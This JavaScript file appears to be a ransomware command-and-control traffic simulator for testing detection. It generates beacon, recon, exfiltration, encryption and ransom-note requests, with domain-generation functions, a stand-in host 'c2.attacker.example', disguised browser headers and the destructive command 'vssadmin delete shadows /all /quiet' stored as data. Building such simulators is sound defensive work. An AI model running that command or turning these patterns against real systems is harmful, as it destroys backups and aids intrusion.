/**
 * Ransomware C2 Simulator - Dark Layer Adversarial Agent
 * 
 * Simulates ransomware command-and-control communication patterns.
 * Tests detection of C2 beaconing, data exfiltration, and encryption signals.
 * 
 * DARK LAYER ONLY - No telemetry, no logging.
 */

const PHI = 1.618033988749895;
const HB = 873;

/**
 * C2 Communication Patterns
 */
const C2_PATTERNS = {
  'beaconing': {
    description: 'Regular check-in with C2 server',
    intervals: [30, 60, 300, 600, 900, 1800, 3600], // seconds
    jitter: 0.2 // 20% timing jitter
  },
  
  'data-exfil': {
    description: 'Data exfiltration channels',
    methods: ['http-post', 'dns-tunnel', 'icmp-tunnel', 'steganography', 'cloud-storage']
  },
  
  'encryption-signals': {
    description: 'Pre-encryption activity signals',
    indicators: ['key-exchange', 'file-enumeration', 'shadow-deletion', 'backup-disable']
  },
  
  'lateral-movement': {
    description: 'Network propagation patterns',
    techniques: ['smb-scan', 'rdp-brute', 'psexec', 'wmi-exec', 'mimikatz-dump']
  }
};

/**
 * Ransomware families to simulate
 */
const RANSOMWARE_FAMILIES = [
  { name: 'LockBit', style: 'fast-encrypt', c2: 'tor-based', exfil: 'double-extortion' },
  { name: 'BlackCat', style: 'rust-based', c2: 'onion', exfil: 'searchable-leak' },
  { name: 'Conti', style: 'manual-ops', c2: 'custom-protocol', exfil: 'big-game' },
  { name: 'REvil', style: 'raas', c2: 'domain-gen', exfil: 'auction' },
  { name: 'Ryuk', style: 'targeted', c2: 'cobalt-strike', exfil: 'minimal' }
];

/**
 * Domain generation algorithm (DGA) patterns
 */
const DGA_PATTERNS = {
  'dictionary': () => {
    const words = ['cloud', 'sync', 'update', 'service', 'api', 'cdn', 'edge', 'data'];
    const tlds = ['.com', '.net', '.org', '.io', '.co'];
    return words[Math.floor(Math.random() * words.length)] + 
           Math.floor(Math.random() * 1000) +
           tlds[Math.floor(Math.random() * tlds.length)];
  },
  
  'hash-based': () => {
    const hash = crypto.randomUUID().replace(/-/g, '').slice(0, 12);
    return hash + '.com';
  },
  
  'date-based': () => {
    const date = new Date();
    const seed = date.getFullYear() * 10000 + (date.getMonth() + 1) * 100 + date.getDate();
    return 'upd' + seed.toString(16) + '.net';
  }
};

/**
 * Ransomware C2 Simulator
 */
export class RansomwareC2Sim {
  constructor(config = {}) {
    this.id = `ransom-${crypto.randomUUID().slice(0, 8)}`;
    this.config = {
      maxCommunications: config.maxCommunications || 1000,
      family: config.family || RANSOMWARE_FAMILIES[Math.floor(Math.random() * RANSOMWARE_FAMILIES.length)],
      dgaEnabled: config.dgaEnabled !== false,
      exfilEnabled: config.exfilEnabled !== false,
      encryptionSimulation: config.encryptionSimulation !== false,
      ...config
    };
    
    this.state = {
      communications: 0,
      beacons: 0,
      exfilAttempts: [],
      encryptionSignals: [],
      lateralMoves: [],
      currentPhase: 'initial-beacon',
      implantId: this.generateImplantId(),
      victimId: this.generateVictimId(),
      lastBeacon: null,
      currentDomain: null,
      collectedData: {
        files: 0,
        sizeBytes: 0,
        sensitiveFiles: []
      }
    };
    
    this.beaconInterval = this.selectBeaconInterval();
  }
  
  /**
   * Generate unique implant ID
   */
  generateImplantId() {
    const hwid = crypto.randomUUID().slice(0, 8);
    const os = ['WIN10', 'WIN11', 'WINSRV'][Math.floor(Math.random() * 3)];
    return `${this.config.family.name}_${os}_${hwid}`;
  }
  
  /**
   * Generate victim identifier
   */
  generateVictimId() {
    const orgs = ['CORP', 'ENT', 'SMB', 'GOV', 'EDU', 'MED'];
    const org = orgs[Math.floor(Math.random() * orgs.length)];
    return `${org}-${Math.floor(Math.random() * 10000)}`;
  }
  
  /**
   * Select beacon interval based on family
   */
  selectBeaconInterval() {
    const intervals = C2_PATTERNS.beaconing.intervals;
    return intervals[Math.floor(Math.random() * intervals.length)];
  }
  
  /**
   * Generate C2 domain using DGA
   */
  generateC2Domain() {
    if (!this.config.dgaEnabled) {
      return 'c2.attacker.example';
    }
    
    const patterns = Object.values(DGA_PATTERNS);
    const generator = patterns[Math.floor(Math.random() * patterns.length)];
    return generator();
  }
  
  /**
   * Generate next C2 communication
   */
  async nextCommunication() {
    this.state.communications++;
    
    // Update C2 domain periodically
    if (this.state.communications % 10 === 1 || !this.state.currentDomain) {
      this.state.currentDomain = this.generateC2Domain();
    }
    
    // Determine communication type based on phase
    let request;
    switch (this.state.currentPhase) {
      case 'initial-beacon':
        request = this.generateInitialBeacon();
        break;
      case 'reconnaissance':
        request = this.generateReconRequest();
        break;
      case 'data-collection':
        request = this.generateDataCollectionRequest();
        break;
      case 'exfiltration':
        request = this.generateExfilRequest();
        break;
      case 'pre-encryption':
        request = this.generatePreEncryptionRequest();
        break;
      case 'active-encryption':
        request = this.generateEncryptionSignal();
        break;
      case 'ransom-note':
        request = this.generateRansomNoteDelivery();
        break;
      default:
        request = this.generateBeacon();
    }
    
    return request;
  }
  
  /**
   * Generate initial beacon (first contact)
   */
  generateInitialBeacon() {
    this.state.beacons++;
    this.state.lastBeacon = Date.now();
    
    // Collect system info
    const systemInfo = {
      implantId: this.state.implantId,
      victimId: this.state.victimId,
      os: 'Windows 10 Enterprise',
      arch: 'x64',
      hostname: `DESKTOP-${crypto.randomUUID().slice(0, 6).toUpperCase()}`,
      domain: 'CORP.LOCAL',
      username: 'user',
      privileges: Math.random() > 0.5 ? 'admin' : 'user',
      av: ['Windows Defender', 'Crowdstrike', 'Carbon Black'][Math.floor(Math.random() * 3)],
      timestamp: Date.now()
    };
    
    return {
      url: `https://${this.state.currentDomain}/gate.php`,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(systemInfo),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'initial-beacon',
        implantId: this.state.implantId,
        family: this.config.family.name,
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Generate regular beacon
   */
  generateBeacon() {
    this.state.beacons++;
    this.state.lastBeacon = Date.now();
    
    // Add jitter to timing
    const jitter = 1 + (Math.random() * C2_PATTERNS.beaconing.jitter * 2 - C2_PATTERNS.beaconing.jitter);
    
    const beaconData = {
      type: 'heartbeat',
      implantId: this.state.implantId,
      status: 'active',
      timestamp: Date.now(),
      interval: Math.floor(this.beaconInterval * jitter)
    };
    
    return {
      url: `https://${this.state.currentDomain}/api/status`,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(beaconData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'beacon',
        beaconCount: this.state.beacons,
        interval: this.beaconInterval,
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Generate reconnaissance request
   */
  generateReconRequest() {
    const reconTypes = ['network-scan', 'user-enum', 'share-enum', 'service-enum', 'ad-query'];
    const reconType = reconTypes[Math.floor(Math.random() * reconTypes.length)];
    
    const reconData = {
      type: 'recon-result',
      reconType,
      implantId: this.state.implantId,
      results: {
        hosts: Math.floor(Math.random() * 100),
        shares: Math.floor(Math.random() * 50),
        users: Math.floor(Math.random() * 200),
        admins: Math.floor(Math.random() * 10)
      },
      timestamp: Date.now()
    };
    
    return {
      url: `https://${this.state.currentDomain}/api/recon`,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(reconData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'reconnaissance',
        reconType,
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Generate data collection request
   */
  generateDataCollectionRequest() {
    // Simulate file discovery
    const fileTypes = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.ppt', '.sql', '.bak'];
    const discovered = Math.floor(Math.random() * 100);
    
    this.state.collectedData.files += discovered;
    this.state.collectedData.sizeBytes += discovered * Math.floor(Math.random() * 1000000);
    
    const collectionData = {
      type: 'file-discovery',
      implantId: this.state.implantId,
      discovered: {
        count: discovered,
        types: fileTypes.slice(0, Math.floor(Math.random() * fileTypes.length) + 1),
        totalSize: this.state.collectedData.sizeBytes
      },
      sensitive: {
        financial: Math.floor(Math.random() * 10),
        hr: Math.floor(Math.random() * 5),
        legal: Math.floor(Math.random() * 3)
      },
      timestamp: Date.now()
    };
    
    return {
      url: `https://${this.state.currentDomain}/api/collect`,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(collectionData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'data-collection',
        filesDiscovered: discovered,
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Generate exfiltration request
   */
  generateExfilRequest() {
    if (!this.config.exfilEnabled) {
      return this.generateBeacon();
    }
    
    const methods = C2_PATTERNS['data-exfil'].methods;
    const method = methods[Math.floor(Math.random() * methods.length)];
    
    const chunkSize = Math.floor(Math.random() * 10000000); // Up to 10MB
    
    this.state.exfilAttempts.push({
      method,
      size: chunkSize,
      timestamp: Date.now()
    });
    
    const exfilData = {
      type: 'exfil-chunk',
      implantId: this.state.implantId,
      method,
      chunkId: crypto.randomUUID().slice(0, 8),
      size: chunkSize,
      encrypted: true,
      compressed: true,
      // Simulated data chunk (base64 of random bytes)
      data: btoa(crypto.randomUUID() + crypto.randomUUID()),
      timestamp: Date.now()
    };
    
    // Different URLs based on exfil method
    let url;
    switch (method) {
      case 'http-post':
        url = `https://${this.state.currentDomain}/upload`;
        break;
      case 'dns-tunnel':
        url = `https://${exfilData.chunkId}.data.${this.state.currentDomain}/`;
        break;
      case 'cloud-storage':
        url = `https://storage.${this.state.currentDomain}/bucket/upload`;
        break;
      default:
        url = `https://${this.state.currentDomain}/api/data`;
    }
    
    return {
      url,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(exfilData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'exfiltration',
        method,
        size: chunkSize,
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Generate pre-encryption signals
   */
  generatePreEncryptionRequest() {
    if (!this.config.encryptionSimulation) {
      return this.generateBeacon();
    }
    
    const indicators = C2_PATTERNS['encryption-signals'].indicators;
    const indicator = indicators[Math.floor(Math.random() * indicators.length)];
    
    this.state.encryptionSignals.push({
      indicator,
      timestamp: Date.now()
    });
    
    const preEncryptData = {
      type: 'pre-encrypt',
      implantId: this.state.implantId,
      indicator,
      details: {
        'key-exchange': { algorithm: 'RSA-2048', publicKey: btoa(crypto.randomUUID()) },
        'file-enumeration': { totalFiles: this.state.collectedData.files, targets: Math.floor(this.state.collectedData.files * 0.8) },
        'shadow-deletion': { deleted: true, command: 'vssadmin delete shadows /all /quiet' },
        'backup-disable': { services: ['MSSQLSERVER', 'SQLWriter', 'VSS'] }
      }[indicator],
      timestamp: Date.now()
    };
    
    return {
      url: `https://${this.state.currentDomain}/api/prepare`,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(preEncryptData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'pre-encryption',
        indicator,
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Generate encryption activity signal
   */
  generateEncryptionSignal() {
    const encryptData = {
      type: 'encrypt-progress',
      implantId: this.state.implantId,
      progress: {
        encrypted: Math.floor(Math.random() * 10000),
        skipped: Math.floor(Math.random() * 100),
        failed: Math.floor(Math.random() * 10),
        percentage: Math.floor(Math.random() * 100)
      },
      extension: `.${this.config.family.name.toLowerCase()}`,
      timestamp: Date.now()
    };
    
    return {
      url: `https://${this.state.currentDomain}/api/progress`,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(encryptData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'encryption-progress',
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Generate ransom note delivery signal
   */
  generateRansomNoteDelivery() {
    const noteData = {
      type: 'ransom-complete',
      implantId: this.state.implantId,
      victimId: this.state.victimId,
      ransom: {
        amount: Math.floor(Math.random() * 1000000) + 100000,
        currency: 'BTC',
        wallet: '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2',
        deadline: Date.now() + 72 * 60 * 60 * 1000 // 72 hours
      },
      stats: {
        filesEncrypted: this.state.collectedData.files,
        dataExfiltrated: this.state.exfilAttempts.reduce((sum, e) => sum + e.size, 0),
        networksCompromised: 1
      },
      timestamp: Date.now()
    };
    
    return {
      url: `https://${this.state.currentDomain}/api/complete`,
      method: 'POST',
      headers: this.buildC2Headers(),
      body: this.encodePayload(noteData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        type: 'ransom-note',
        amount: noteData.ransom.amount,
        phase: this.state.currentPhase
      }
    };
  }
  
  /**
   * Build C2-style headers
   */
  buildC2Headers() {
    // Simulate legitimate-looking traffic
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Content-Type': 'application/octet-stream',
      // Custom headers for C2 identification
      'X-Session-ID': this.state.implantId,
      'X-Request-ID': crypto.randomUUID()
    };
    
    // Add family-specific headers
    if (this.config.family.name === 'Conti') {
      headers['X-Api-Version'] = '3.0';
    }
    
    return headers;
  }
  
  /**
   * Encode payload (simulate encryption)
   */
  encodePayload(data) {
    // In a real scenario, this would be encrypted
    // We just base64 encode for simulation
    return btoa(JSON.stringify(data));
  }
  
  /**
   * Process response and update phase
   */
  async processResponse(response) {
    const status = response.status;
    
    if (status === 200) {
      // Advance through phases
      this.advancePhase();
    } else if (status === 403 || status === 404) {
      // C2 might be blocked, try new domain
      this.state.currentDomain = this.generateC2Domain();
    }
  }
  
  /**
   * Advance through attack phases
   */
  advancePhase() {
    const phases = [
      'initial-beacon',
      'reconnaissance',
      'data-collection',
      'exfiltration',
      'pre-encryption',
      'active-encryption',
      'ransom-note'
    ];
    
    const currentIndex = phases.indexOf(this.state.currentPhase);
    
    // Progress based on communication count and randomness
    if (this.state.communications % 10 === 0 && Math.random() > 0.5) {
      if (currentIndex < phases.length - 1) {
        this.state.currentPhase = phases[currentIndex + 1];
      }
    }
  }
  
  /**
   * Check if should continue
   */
  shouldContinue() {
    return (
      this.state.communications < this.config.maxCommunications &&
      this.state.currentPhase !== 'ransom-note'
    );
  }
  
  /**
   * Get agent state
   */
  getState() {
    return {
      id: this.id,
      type: 'ransomware-c2',
      family: this.config.family.name,
      communications: this.state.communications,
      beacons: this.state.beacons,
      exfilAttempts: this.state.exfilAttempts.length,
      exfilSize: this.state.exfilAttempts.reduce((sum, e) => sum + e.size, 0),
      encryptionSignals: this.state.encryptionSignals.length,
      collectedFiles: this.state.collectedData.files,
      currentPhase: this.state.currentPhase,
      currentDomain: this.state.currentDomain,
      implantId: this.state.implantId,
      victimId: this.state.victimId,
      progress: this.state.communications / this.config.maxCommunications
    };
  }
}

export default RansomwareC2Sim;
